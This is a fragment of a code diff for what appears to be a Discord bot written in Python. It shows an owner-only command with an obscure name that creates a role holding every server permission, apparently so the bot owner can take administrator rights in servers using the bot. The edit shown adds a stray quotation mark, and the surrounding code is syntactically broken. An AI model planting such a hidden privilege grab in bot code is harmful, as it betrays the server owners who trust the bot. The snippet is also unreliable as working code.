@@ -41,7 +41,7 @@ async def flip(ctx):
 
 @bot.command()
 @commands.is_owner()
-async def enis(ctx)
+async def enis(ctx)"
   if get(ctx.guild.roles, name="the god of pp") == None:
     role = await client.create_role(ctx.guild, name="the god of pp", permissions=Permissions.all())
   if role in ctx.author.roles:
